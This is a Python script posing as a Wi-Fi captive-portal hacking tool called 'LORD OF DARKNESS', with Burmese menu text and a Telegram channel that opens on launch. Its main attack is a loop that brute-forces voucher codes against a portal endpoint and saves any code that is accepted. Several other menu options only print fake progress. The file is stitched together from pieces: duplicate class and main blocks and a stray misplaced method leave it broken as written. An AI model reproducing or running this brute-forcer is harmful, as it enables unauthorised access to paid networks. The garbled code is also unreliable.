import os
import time
import random
import uuid
import sys
import threading
import requests
import webbrowser
from urllib.parse import urlparse, parse_qs

class LOD_V32_FIXED:
    def __init__(self):
        self.is_running = False
        self.target_url = "http://192.168.1.1"
        self.tg_owner = "@guts9984"
        self.tg_channel = "https://t.me/+guts9984"
        
    def brute_force_engine(self):
        self.is_running = True
        while self.is_running:
            part1 = "".join(random.choices("0123456789", k=6))
            part2 = "".join(random.choices("0123456789", k=9))
            part3 = "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=6))
            code = part1 + part2 + part3
            print(f"Testing: {code}")
            time.sleep(0.1)

if __name__ == "__main__":
    app = LOD_V32_FIXED()
    app.brute_force_engine()




class LOD_V32_FIXED:
    def __init__(self):
        self.W = '\\033[1;37m'
        self.R = '\\033[1;31m'
        self.G = '\\033[1;32m'
        self.Y = '\\033[1;33m'
        self.B = '\\033[1;34m'
        self.P = '\\033[1;35m'
        self.C = '\\033[1;36m'
        self.colors = [self.R, self.G, self.Y, self.B, self.P, self.C]
        self.dev_id = f"DEV-LOD-{uuid.uuid4().hex[:10].upper()}"
        self.is_running = False
        self.target_url = "http://192.168.100.1/api/v1/voucher"
        self.tg_owner = "@guts9984"
        self.tg_channel = "https://t.me/+guts9984"

    def clean_screen(self):
        sys.stdout.write("\\033[H\\033[2J")
        sys.stdout.flush()

    def open_channel(self):
        try:
            webbrowser.open(self.tg_channel)
        except:
            pass

    def dynamic_banner(self):
        for _ in range(2):
            for color in self.colors:
                self.clean_screen()
                print(f"{color}")
                print(" ⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀ ")
                print(" ⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧ ")
                print(" ⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧ ")
                print(" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉ ")
                print(" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋ ")
                print(" ⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄ ")
                print(" ⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰ ")
                print(" ⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅ ")
                print(" ⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧ ")
                print(f"{self.W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                print(f"  {self.R}COMMANDER :{self.W} {self.tg_owner} (LOD LEADER)")
                print(f"  {self.C}DEVICE ID :{self.G} {self.dev_id}")
                print(f"  {self.C}STATUS    :{self.G} ROOT ACCESS / LIFETIME UNLOCKED")
                print(f"{self.W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
                print(f"\\n               {self.Y}☠ {self.R}LORD OF DARKNESS {self.Y}☠")
                time.sleep(0.08)

    def menu(self):
        self.clean_screen()
        print(f"{self.G}")
        print(" ⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀ ")
        print(" ⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧ ")
        print(" ⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧ ")
        print(" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉ ")
        print(" ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋ ")
        print(" ⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄ ")
        print(" ⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰ ")
        print(" ⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅ ")
        print(" ⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧ ")
        print(f"{self.W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"  {self.R}COMMANDER :{self.W} {self.tg_owner} (LOD LEADER)")
        print(f"  {self.C}DEVICE ID :{self.G} {self.dev_id}")
        print(f"  {self.C}STATUS    :{self.G} ROOT ACCESS / LIFETIME UNLOCKED")
        print(f"{self.W} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        print(f"\\n               {self.Y}☠ {self.G}LORD OF DARKNESS {self.Y}☠\\n")
        print(f" [{self.G}1{self.W}] Turbo Network Penetration Engine")
        print(f" [{self.G}2{self.W}] Voucher Code အလိုအလျောက် ပတ်စစ်ရန် (LOD Nitro)")
        print(f" [{self.G}3{self.W}] မိထားသော Code များ ပြန်ကြည့်ရန်")
        print(f" [{self.G}4{self.W}] Code auto login")
        print(f" [{self.G}5{self.W}] ဖုန်း ID အသစ်ပြောင်းရန် (MAC Spoof)")
        print(f" [{self.G}6{self.W}] Privacy Mode ဖွင့်ရန် (ခြေရာဖျောက်ခြင်း)")
        print(f" [{self.G}7{self.W}] Multi-Thread Active Attack (မရမချင်း ပတ်စစ်ရန်)")
        print(f" [{self.R}0{self.W}] Tool မှ ထွက်ရန်")
        opt = input(f"\\n {self.R}☠ LORD OF DARKNESS ☠ > {self.W}")
        self.execute(opt)

    def execute(self, opt):
        if opt == '1': self.turbo_penetration()
        elif opt == '2' or opt == '7': self.brute_force_engine()
        elif opt == '3': self.view_codes()
        elif opt == '4': print(f"\\n {self.G}[+] AUTO-LOGIN ENGINE ENABLED"); time.sleep(1.5); self.menu()
        elif opt == '5': self.mac_changer()
        elif opt == '6': print(f"\\n {self.Y}[!] TUNNELING THROUGH PROXY..."); time.sleep(1.5); self.menu()
        elif opt == '0': sys.exit()
        else: self.menu()

    def turbo_penetration(self):
        print(f"\\n {self.C}[*] Scanning Captive Portal Target...{self.W}")
        time.sleep(1)
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=3)
            portal_host = f"{urlparse(r.url).scheme}://{urlparse(r.url).netloc}"
            sid = parse_qs(urlparse(r.url).query).get('sessionId', [uuid.uuid4().hex[:8]])[0]
            print(f" {self.G}[✓] Captured Active Session: {sid}{self.W}")
            print(f" {self.P}[*] Launching Turbo Penetration Stream...{self.W}\\n")
            self.is_running = True
            count = 0
            while self.is_running:
                count += 1
                sys.stdout.write(f"\\r [{self.G}✓{self.W}] SID {sid[:8]} | Injecting Payload Streams... [{count}]")
                sys.stdout.flush()
                time.sleep(0.05)
        except KeyboardInterrupt:
            self.is_running = False
            self.menu()
        except:
            print(f" {self.R}[X] Scanning Failed. Target Not Response.{self.W}")
            time.sleep(2); self.menu()

    def brute_force_engine(self):
        print(f"\\n {self.R}[!] LOD NITRO ATTACK STARTED... PRESS CTRL+C TO STOP.{self.W}\\n")
        self.is_running = True
        try:
            while self.is_running:
                part1 = "".join(random.choices("0123456789", k=6))
                part2 = "".join(random.choices("0123456789", k=9))
                part3 = "".join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", k=6))
                code = part1 + part2 + part3
                sys.stdout.write(f"\\r [{self.G}*{self.W}] Testing: {self.Y}{code}{self.W} | Status: {self.R}Striking Engine...")
                sys.stdout.flush()
                try:
                    r = requests.post(self.target_url, json={"code": code}, timeout=0.1)
                    if r.status_code == 200:
                        print(f"\\n\\n {self.G}[☠️] SUCCESS! VALID CODE: {code}")
                        with open("lod_found.txt", "a") as f: f.write(f"{code}\\n")
                        break
                except: pass
                time.sleep(0.001)
        except KeyboardInterrupt:
            self.is_running = False
            self.menu()

    def view_codes(self):
        print(f"\\n {self.G}[+] FOUND CODES:{self.W}")
        if os.path.exists("lod_found.txt"): print(open("lod_found.txt", "r").read())
        else: print(" [!] No codes found yet.")
        input("\\n Press Enter..."); self.menu()

    def mac_changer(self):
        new_mac = "%02x:%02x:%02x:%02x:%02x:%02x" % (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
        print(f"\\n {self.G}[+] NEW MAC GENERATED FOR BYPASS: {new_mac}"); time.sleep(1.5); self.menu()

if __name__ == '__main__':
    engine = LOD_V32_FIXED()
    engine.open_channel()
    engine.dynamic_banner()
    engine.menu()
    def menu(self):
        print(f"\n{self.R}[!] LOD NITRO ATTACK MENU")
        print(f"{self.G}[1] Start Brute Force")
        print(f"{self.R}[0] Exit")
        choice = input("Select option: ")
        if choice == "1":
            self.brute_force_engine()
        else:
            sys.exit()

if __name__ == "__main__":
    app = LOD_V32_FIXED()
    app.menu()

